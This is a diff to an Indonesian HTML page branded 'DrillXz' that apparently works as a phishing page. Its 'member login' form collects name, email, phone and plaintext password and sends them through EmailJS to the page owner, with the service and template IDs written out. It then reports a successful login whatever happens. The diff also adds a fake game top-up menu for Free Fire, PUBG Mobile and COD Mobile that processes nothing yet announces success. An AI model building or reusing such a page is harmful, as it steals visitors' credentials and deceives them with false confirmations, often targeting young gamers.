@@ -9,7 +9,7 @@
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function(){
-      emailjs.init('cKKsMvy9twhmPTKlR'); // Public key
+      emailjs.init('cKKsMvy9twhmPTKlR');
     })();
   </script>
 
@@ -35,7 +35,6 @@
       overflow: hidden;
       z-index: 0;
     }
-
     .card::after {
       content: "";
       position: absolute;
@@ -44,19 +43,13 @@
       border-radius: 18px;
       z-index: -1;
     }
-
     .card::before {
       content: "";
       position: absolute;
       inset: 0;
       border-radius: 18px;
       padding: 2px;
-      background: linear-gradient(120deg,
-        #00ffff,
-        #00ff80,
-        #ffff00,
-        #ff00ff,
-        #00ffff);
+      background: linear-gradient(120deg,#00ffff,#00ff80,#ffff00,#ff00ff,#00ffff);
       background-size: 400% 400%;
       animation: neonmove 6s linear infinite;
       -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
@@ -64,172 +57,130 @@
       mask-composite: exclude;
       z-index: -2;
     }
-
     @keyframes neonmove {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      0%{background-position:0% 50%}
+      50%{background-position:100% 50%}
+      100%{background-position:0% 50%}
     }
-
-    h1 { margin-top: 0; text-shadow: 0 0 8px rgba(0,0,0,0.6); }
-    label { display: block; margin: 10px 0 6px; font-weight: 600; }
+    h1 {margin-top:0;text-shadow:0 0 8px rgba(0,0,0,0.6);}
+    label {display:block;margin:10px 0 6px;font-weight:600;}
     input {
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 8px;
-      background: rgba(255,255,255,0.15);
-      color: #fff;
-      backdrop-filter: blur(6px);
-      box-sizing: border-box;
+      width:100%;padding:10px;border:none;border-radius:8px;
+      background:rgba(255,255,255,0.15);color:#fff;
+      backdrop-filter:blur(6px);box-sizing:border-box;
     }
-    input::placeholder { color: #eee; }
+    input::placeholder{color:#eee;}
 
-    .row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 20px;
-      margin-bottom: 10px;
+    .row{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:10px;}
+    button{
+      background:#0b69ff;color:#fff;padding:10px 14px;border:none;
+      border-radius:10px;cursor:pointer;transition:0.3s;
     }
+    button:hover{background:#3288ff;box-shadow:0 0 15px #0b69ff;}
 
-    button {
-      background: #0b69ff;
-      color: #fff;
-      padding: 10px 14px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    button:hover {
-      background: #3288ff;
-      box-shadow: 0 0 15px #0b69ff;
-    }
+    #showPwd{width:16px;height:16px;accent-color:#0b69ff;margin:0;}
+    label[for="showPwd"]{margin:0;font-size:0.85rem;color:#ddd;user-select:none;}
 
-    #showPwd {
-      width: 16px;
-      height: 16px;
-      accent-color: #0b69ff;
-      margin: 0;
+    .success,.error{padding:10px;margin-top:12px;border-radius:8px;}
+    .success{background:rgba(0,255,150,0.25);border:1px solid #00ff80;}
+    .error{background:rgba(255,80,80,0.25);border:1px solid #ff8080;}
+
+    /* ==== HOME ==== */
+    #home{display:none;text-align:center;padding:40px 20px;animation:fadeIn 0.8s ease;}
+    @keyframes fadeOut{from{opacity:1;transform:translateY(0);}to{opacity:0;transform:translateY(20px);}}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+
+    .drillxz-title{
+      display:inline-block;font-size:2.5rem;font-weight:800;color:#00ffff;
+      text-shadow:0 0 10px #f5cb26,0 0 20px #aaff00,0 0 40px #24ff00,0 0 60px #ffb800,0 0 80px #ff5800;
+      margin-bottom:20px;margin-top:-20px;animation:glowPulse 2s infinite alternate ease-in-out;
     }
-    label[for="showPwd"] {
-      margin: 0;
-      font-size: 0.85rem;
-      color: #ddd;
-      user-select: none;
+    @keyframes glowPulse{
+      from{text-shadow:0 0 5px #00ffff,0 0 15px #00ffff,0 0 30px #00ffff,0 0 45px #00ffff;}
+      to{text-shadow:0 0 15px #00ffff,0 0 35px #00ffff,0 0 60px #00ffff,0 0 90px #00ffff;}
     }
 
-    .success, .error {
-      padding: 10px;
-      margin-top: 12px;
-      border-radius: 8px;
+    .bio-card{
+      margin:10px auto;max-width:600px;padding:20px;border-radius:15px;
+      background:rgba(255,255,255,0.08);border:2px solid rgba(0,255,255,0.3);
+      box-shadow:0 0 25px rgba(0,255,255,0.2);text-align:left;
+      backdrop-filter:blur(5px);display:flex;align-items:center;gap:20px;
     }
-    .success {
-      background: rgba(0,255,150,0.25);
-      border: 1px solid #00ff80;
+    .bio-card img{
+      width:90px;height:90px;border-radius:50%;border:3px solid #00ffff;box-shadow:0 0 20px #00ffff;
     }
-    .error {
-      background: rgba(255,80,80,0.25);
-      border: 1px solid #ff8080;
+    .bio-card p{margin:6px 0;color:#ddd;}
+    .social a{color:#00ffff;text-decoration:none;margin-right:12px;}
+    .social a:hover{text-decoration:underline;}
+
+    /* ==== TOP UP SECTION ==== */
+    .topup-section{
+      margin-top:40px;
+      text-align:center;
+    }
+    .game-grid{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
+      gap:15px;
+      max-width:600px;
+      margin:20px auto;
+    }
+    .game-card{
+      background:rgba(255,255,255,0.1);
+      border:1px solid rgba(0,255,255,0.3);
+      border-radius:12px;
+      padding:12px;
+      transition:0.3s;
+      cursor:pointer;
+    }
+    .game-card:hover{
+      transform:scale(1.05);
+      box-shadow:0 0 15px #00ffff;
+    }
+    .game-card img{
+      width:80px;
+      height:80px;
+      object-fit:contain;
+      margin-bottom:6px;
     }
 
-    /* ==== HOME MENU ==== */
-    #home {
-      display: none;
-      text-align: center;
-      padding: 40px 20px;
-      animation: fadeIn 0.8s ease;
+    /* ==== PAGE TOPUP ==== */
+    #topupPage{
+      display:none;
+      text-align:center;
+      animation:fadeIn 0.6s ease;
     }
-
-    @keyframes fadeOut {
-      from { opacity: 1; transform: translateY(0); }
-      to { opacity: 0; transform: translateY(20px); }
+    .diamond-grid{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(140px,1fr));
+      gap:15px;
+      max-width:600px;
+      margin:20px auto;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+    .diamond-card{
+      background:rgba(255,255,255,0.08);
+      border:1px solid rgba(0,255,255,0.3);
+      border-radius:10px;
+      padding:10px;
+      cursor:pointer;
+      transition:0.3s;
     }
-
-    /* ==== DrillXz text LED ==== */
-    .drillxz-title {
-      display: inline-block;
-      font-size: 2.5rem;
-      font-weight: 800;
-      color: #00ffff;
-      text-shadow:
-        0 0 10px #f5cb26,
-        0 0 20px #aaff00,
-        0 0 40px #24ff00,
-        0 0 60px #ffb800,
-        0 0 80px #ff5800;
-      margin-bottom: 20px;
-      margin-top: -20px;
-      animation: glowPulse 2s infinite alternate ease-in-out;
+    .diamond-card:hover{
+      box-shadow:0 0 15px #00ffff;
+      transform:scale(1.05);
     }
-
-    @keyframes glowPulse {
-      from {
-        text-shadow:
-          0 0 5px #00ffff,
-          0 0 15px #00ffff,
-          0 0 30px #00ffff,
-          0 0 45px #00ffff;
-      }
-      to {
-        text-shadow:
-          0 0 15px #00ffff,
-          0 0 35px #00ffff,
-          0 0 60px #00ffff,
-          0 0 90px #00ffff;
-      }
-    }
-
-    /* ==== Card biodata ==== */
-    .bio-card {
-      margin: 10px auto;
-      max-width: 600px;
-      padding: 20px;
-      border-radius: 15px;
-      background: rgba(255,255,255,0.08);
-      border: 2px solid rgba(0,255,255,0.3);
-      box-shadow: 0 0 25px rgba(0,255,255,0.2);
-      text-align: left;
-      backdrop-filter: blur(5px);
-      display: flex;
-      align-items: center;
-      gap: 20px;
-    }
-
-    .bio-card img {
-      width: 90px;
-      height: 90px;
-      border-radius: 50%;
-      border: 3px solid #00ffff;
-      box-shadow: 0 0 20px #00ffff;
-    }
-
-    .bio-card p {
-      margin: 6px 0;
-      color: #ddd;
-    }
-
-    .social a {
-      color: #00ffff;
-      text-decoration: none;
-      margin-right: 12px;
-    }
-    .social a:hover {
-      text-decoration: underline;
+    .diamond-card.selected{
+      border-color:#00ffff;
+      box-shadow:0 0 20px #00ffff;
     }
   </style>
 </head>
 
 <body>
-  <!-- ==== LOGIN PAGE ==== -->
+  <!-- LOGIN -->
   <div id="login" class="card">
     <h1>Login Anggota</h1>
     <p style="color:#ddd">Isi data di bawah ini untuk login.</p>
-
     <form id="memberForm">
       <div class="row">
         <div>
@@ -241,18 +192,14 @@
           <input id="email" name="email" type="email" placeholder="contoh@gmail.com" required />
         </div>
       </div>
-
       <label for="phone">Nomor Telepon</label>
       <input id="phone" name="phone" placeholder="08xxxxxxxxxx" />
-
       <label for="password">Password</label>
       <input id="password" name="password" type="password" placeholder="Masukkan password" required />
-
       <div style="margin-top:6px;display:flex;align-items:center;gap:8px">
         <input id="showPwd" type="checkbox" />
         <label for="showPwd">Tampilkan password</label>
       </div>
-
       <div style="margin-top:12px;display:flex;gap:8px;align-items:center">
         <button type="submit">Kirim</button>
         <div id="status" style="flex:1"></div>
@@ -260,10 +207,9 @@
     </form>
   </div>
 
-  <!-- ==== HOME MENU ==== -->
+  <!-- HOME -->
   <div id="home">
     <h2 class="drillxz-title">☆𝐃𝐫𝐢𝐥𝐥𝐗𝐳☆</h2>
-
     <div class="bio-card">
       <img src="aset/logo.jpg" alt="Logo" />
       <div>
@@ -276,6 +222,37 @@
         </div>
       </div>
     </div>
+
+    <!-- TOP UP SECTION -->
+    <div class="topup-section" id="gameMenu">
+      <h2>🎮 Top Up Game</h2>
+      <div class="game-grid">
+        <div class="game-card" onclick="openTopup('Free Fire')">
+          <img src="aset/ff.png" alt="Free Fire">
+          <p>Free Fire</p>
+        </div>
+        <div class="game-card" onclick="openTopup('PUBG Mobile')">
+          <img src="aset/pubg.png" alt="PUBG">
+          <p>PUBG Mobile</p>
+        </div>
+        <div class="game-card" onclick="openTopup('COD Mobile')">
+          <img src="aset/codm.png" alt="CODM">
+          <p>Call of Duty Mobile</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TOP UP PAGE -->
+  <div id="topupPage">
+    <h2 id="gameTitle"></h2>
+    <p>Masukkan User ID kamu:</p>
+    <input id="userIdInput" placeholder="Masukkan User ID" />
+    <div class="diamond-grid" id="diamondList"></div>
+    <button onclick="processTopup()">LANJUT</button>
+    <div style="margin-top:15px">
+      <button onclick="backToHome()">⬅ Kembali</button>
+    </div>
   </div>
 
   <script>
@@ -285,43 +262,84 @@
       p.type = this.checked ? 'text' : 'password';
     });
 
-    // EmailJS + animasi transisi
+    // EmailJS + transisi login
     const form = document.getElementById('memberForm');
     const statusEl = document.getElementById('status');
-
     form.addEventListener('submit', function(e){
       e.preventDefault();
       statusEl.innerHTML = '<div class="success">⏳ Mengcoba login..</div>';
-
       const params = {
-        fullname: document.getElementById('fullname').value.trim(),
-        email: document.getElementById('email').value.trim(),
-        phone: document.getElementById('phone').value.trim(),
-        password: document.getElementById('password').value,
+        fullname: fullname.value.trim(),
+        email: email.value.trim(),
+        phone: phone.value.trim(),
+        password: password.value
       };
-
       if(!params.fullname || !params.email || !params.password){
         statusEl.innerHTML = '<div class="error">Nama, email, dan password wajib diisi.</div>';
         return;
       }
-
       emailjs.send('service_x0mb56a','template_d41h15m',params)
-        .then(function(){
-          statusEl.innerHTML = '<div class="success">✅ Login berhasil!.</div>';
-          const login = document.getElementById('login');
-          const home = document.getElementById('home');
-          setTimeout(()=>{
-            login.style.animation = 'fadeOut 0.8s forwards';
-            setTimeout(()=>{
-              login.style.display = 'none';
-              home.style.display = 'block';
-            },800);
-          },1000);
-        })
-        .catch(function(error){
-          statusEl.innerHTML = '<div class="error">❌ Gagal mengirim: ' + (error.text || 'Cek koneksi atau ID EmailJS') + '</div>';
-        });
+      .then(()=>{
+        statusEl.innerHTML = '<div class="success">✅ Login berhasil!</div>';
+        setTimeout(()=>{
+          login.style.animation='fadeOut 0.8s forwards';
+          setTimeout(()=>{login.style.display='none';home.style.display='block';},800);
+        },1000);
+      })
+      .catch(error=>{
+        statusEl.innerHTML='<div class="error">❌ Gagal mengirim: '+(error.text||'Cek koneksi')+'</div>';
+      });
     });
+
+    // === TOP UP LOGIC ===
+    const topupPage = document.getElementById("topupPage");
+    const homePage = document.getElementById("home");
+    const diamondList = document.getElementById("diamondList");
+    const gameTitle = document.getElementById("gameTitle");
+
+    const diamondOptions = [
+      {name:"5 Diamonds", price:"Rp975"},
+      {name:"50 Diamonds + 250MB", price:"Rp7.650"},
+      {name:"70 Diamonds + 250MB", price:"Rp9.575"},
+      {name:"140 Diamonds + 500MB", price:"Rp19.150"},
+      {name:"355 Diamonds", price:"Rp39.000"},
+      {name:"720 Diamonds", price:"Rp77.000"}
+    ];
+
+    let selectedDiamond = null;
+    let currentGame = "";
+
+    function openTopup(game){
+      currentGame = game;
+      homePage.style.display="none";
+      topupPage.style.display="block";
+      gameTitle.textContent = "Top Up " + game;
+      diamondList.innerHTML = "";
+      diamondOptions.forEach(opt=>{
+        const card = document.createElement("div");
+        card.className="diamond-card";
+        card.innerHTML = `<h4>${opt.name}</h4><p>${opt.price}</p>`;
+        card.onclick=()=>{
+          document.querySelectorAll(".diamond-card").forEach(c=>c.classList.remove("selected"));
+          card.classList.add("selected");
+          selectedDiamond = opt;
+        };
+        diamondList.appendChild(card);
+      });
+    }
+
+    function backToHome(){
+      topupPage.style.display="none";
+      homePage.style.display="block";
+    }
+
+    function processTopup(){
+      const userId = document.getElementById("userIdInput").value.trim();
+      if(!userId){alert("Masukkan User ID terlebih dahulu!");return;}
+      if(!selectedDiamond){alert("Pilih paket diamond!");return;}
+      alert(`✅ Top Up ${selectedDiamond.name} untuk ${currentGame} berhasil diproses!\nUser ID: ${userId}`);
+      backToHome();
+    }
   </script>
 </body>
 </html>
